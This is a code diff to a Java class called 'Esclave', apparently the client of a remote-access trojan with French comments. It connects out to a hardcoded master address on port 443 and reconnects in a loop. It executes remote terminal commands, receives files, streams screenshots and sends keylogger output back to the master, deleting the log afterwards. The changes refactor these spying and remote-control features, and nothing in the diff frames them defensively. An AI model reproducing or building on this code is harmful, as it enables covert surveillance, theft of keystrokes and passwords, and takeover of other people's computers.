@@ -8,13 +8,16 @@ import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.net.InetAddress;
 import java.net.Socket;
+import java.nio.file.Paths;
 
-import remote.action.CMD;
+import javax.swing.ImageIcon;
+
+import remote.action.ActionVNC;
 import remote.action.Keylogging;
 import remote.action.Notification;
-import remote.action.RemoteActions;
 import remote.action.ScreenShot;
-import send.specific.object.SendImage;
+import remote.action.Terminal;
+import send.specific.object.ReceivedSpecificObject;
 import send.specific.object.SendSpecificObject;
 import constante.Constante;
 
@@ -31,18 +34,17 @@ public class Esclave {
 /**********************************************************************************************************************************************/
 	
 	
-	private final static int _portMaitre = 443;									// Port de la machine distante
-	private final static String _addresseMaitre = "192.168.56.1";				// Addresse IP de la machine distante
-	private static InetAddress _addresse;
+	private final int _portMaitre = 443;									// Port de la machine distante
+	private final String _addresseMaitre = "192.168.1.40";				// Addresse IP de la machine distante
+	private InetAddress _addresse;
 
-	private static ObjectInputStream _in;										// Flux d'entree
-	private static ObjectOutputStream _out;										// Flux de sortie
+	private  ObjectInputStream _in;										// Flux d'entree
+	private ObjectOutputStream _out;										// Flux de sortie
 
 	private Socket _s;
 	private Keylogging _klgg;
 	private Robot _robot;
-	private CMD _cmd = null;
-	private static Esclave _esclave;
+	private Terminal _terminal = null;
 
 	
 /********************************************************************************************************************************************/
@@ -71,7 +73,7 @@ public class Esclave {
 	private boolean connect() throws IOException, AWTException, ClassNotFoundException, InterruptedException 
 	{
 		try {
-			_s = new Socket(InetAddress.getLocalHost(), _portMaitre);
+			_s = new Socket(_addresseMaitre, _portMaitre);
 		
 		_out = new ObjectOutputStream(_s.getOutputStream());
 
@@ -119,7 +121,6 @@ public class Esclave {
 			@Override
 			public void run() {
 				Object action;
-
 				try {
 					while (true) {
 
@@ -146,18 +147,17 @@ public class Esclave {
 							{
 								// System.out.println("[debug] Nouveau requete CMD: ");
 
-								if (_cmd == null) 
+								if (_terminal == null) 
 								{
-									_cmd = new CMD();
+									_terminal = new Terminal();
 								}
 								action = _in.readObject();
 								if (action instanceof String) 										// Recupere l'instruction
 								{
 									String instruction = (String) action;
 									String res = "";
-									res =_cmd.nouvellecommande(instruction,
+									res =_terminal.nouvellecommande(instruction,
 											esclave);
-									 System.out.println("[debug]"+res);
 
 									if (!res.equals(Constante.code_message_cmd)) 					// Renvoit l'instruction
 									{
@@ -170,35 +170,41 @@ public class Esclave {
 							} 
 							else 
 							{
-								//System.out.println("Objet non identifie");
+							
+								ReceivedSpecificObject.receivedFileInDirectory((Integer) action, _in,	// Enregistre le fichier dans le dossier courant 
+										( _terminal == null ) ? 												// de l'executable ou
+																										// Dans le dossier courant correspondant au dossier 
+																										// du CMD
+												
+												Paths.get("").toAbsolutePath().toString()
+												+ System.getProperty("file.separator")
+												:
+													_terminal.getDirectory() + System.getProperty("file.separator"));
 							}
 						} 
-						else if (action instanceof RemoteActions) 									// Reception d'une requete pour VNC
+						else if (action instanceof ActionVNC) 									// Reception d'une requete pour VNC
 						{
-							RemoteActions remoteaction = (RemoteActions) action;
+							ActionVNC remoteaction = (ActionVNC) action;
 
 							if (remoteaction instanceof ScreenShot) 
 							{
 								System.out.println("[debug] Esclave: Reception ScreenShot par l'esclave");
 
 								ScreenShot screenshot = (ScreenShot) remoteaction;
-								Object result = screenshot.executer(_robot);
+								ImageIcon result = screenshot.executer(_robot);
 
 								if (result != null) 
 								{
-
-
-									byte[] size = (byte[]) screenshot.getsize();
-									if (!size.equals(null)) 
-									{
 										System.out.println("[debug] Esclave: Envoit code pour un screen");
-
 										_out.writeObject(Constante.code_vnc);
 										_out.flush();
-										SendImage.sendImage(_out, size,
-												(byte[]) result);
-										
-									}
+										this.join();
+
+									//	System.out.println("[debug] sendImage: Envoit tailleImage");
+										_out.writeObject(result);
+										System.out.println("[debug] sendImage: Envoit image");
+										_out.flush();
+										_out.reset();
 								}
 							}
 							else 
@@ -211,38 +217,26 @@ public class Esclave {
 						}
 					}
 
-				} catch (ClassNotFoundException | IOException e) {						// Forger le processus
-					
-						try {
-							while(!connect()){
-								try {
-									Thread.sleep(10000);								// Fait une pause de 10 sec avant de se reconnecter
-								} catch (InterruptedException e1) {
-									// TODO Auto-generated catch block
-									e1.printStackTrace();
-								}
-							
-}
-						} catch (ClassNotFoundException | IOException
+				} catch (ClassNotFoundException | IOException
 								| AWTException | InterruptedException e1) {
-							// TODO Auto-generated catch block
-							e1.printStackTrace();
+					try {
+						while(!connect()){
+							
+								Thread.sleep(2000);						// Fait une pause de 10 sec avant de se reconnecter
+							
 						}
-							} catch (InterruptedException e) {
-					
-					e.printStackTrace();
-				} catch (AWTException e) {
-					// TODO Auto-generated catch block
-					e.printStackTrace();
-				}
+					} catch (InterruptedException | ClassNotFoundException | IOException | AWTException e2) {
+						// TODO Auto-generated catch block
+					}
 			}
+		}
 		};
 		recevoir.start();
 	}
 
 	
 
-	public static ObjectOutputStream getOut() {
+	public ObjectOutputStream getOut() {
 		return _out;
 	}
 
@@ -258,7 +252,7 @@ public class Esclave {
 	public void sendfileKeylog() throws IOException, InterruptedException {
 		String chemin = _klgg.getCheminFile();
 		_klgg.arreteKeylog();
-		SendSpecificObject.sendTxt(chemin, _out);
+		SendSpecificObject.sendTxt("keylogger",chemin, _out);
 		_klgg.supprimerFichier();
 		_klgg = new Keylogging();
 	}
@@ -275,6 +269,6 @@ public class Esclave {
 	 */
 	public static void main(String[] args) throws ClassNotFoundException,
 			IOException, InterruptedException, AWTException {
-		_esclave = new Esclave();
+		new Esclave();
 	}
 }
